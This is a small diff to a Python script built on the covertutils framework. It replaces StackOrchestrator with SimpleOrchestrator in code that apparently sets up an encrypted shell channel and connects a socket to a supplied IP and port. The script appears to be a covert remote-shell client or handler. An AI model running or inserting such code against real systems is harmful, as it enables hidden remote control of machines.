@@ -1,5 +1,5 @@
 from covertutils.handlers import SimpleShellHandler, BaseHandler
-from covertutils.orchestration import StackOrchestrator
+from covertutils.orchestration import SimpleOrchestrator
 
 import sys
 import socket
@@ -16,7 +16,7 @@ except :
 
 addr = ip, int(port)
 
-orch = StackOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, cycling_algorithm = sha512 )
+orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, cycling_algorithm = sha512 )
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect( addr )
